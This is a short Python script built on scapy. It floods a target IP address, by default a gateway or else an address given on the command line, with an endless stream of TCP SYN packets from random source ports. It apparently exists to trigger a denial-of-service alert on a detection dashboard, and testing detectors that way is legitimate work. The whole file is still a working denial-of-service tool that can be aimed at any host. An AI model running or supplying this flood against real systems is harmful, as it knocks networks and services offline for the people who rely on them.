from scapy.all import IP, TCP, send
import sys
import time
import random

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.1" # Default to Gateway
if len(sys.argv) > 1:
    TARGET_IP = sys.argv[1]

print(f"🔥 [AGGRESSIVE] Network SYN Flood")
print(f"[*] Targeting: {TARGET_IP}")
print(f"[*] This will trigger 'DoS-SYN' on the dashboard.")
time.sleep(2)

count = 0
try:
    while True:
        # Randomize source port and sequence number for a "louder" signature
        pkt = IP(dst=TARGET_IP)/TCP(sport=random.randint(1024, 65535), dport=80, flags="S", seq=random.randint(1000, 9000))
        send(pkt, verbose=0, count=10) # Send in bursts of 10
        count += 10
        if count % 100 == 0:
            print(f"🚀 Sent {count} SYN packets...", end='\r')
except KeyboardInterrupt:
    print(f"\n🛑 Stopped. Total: {count}")
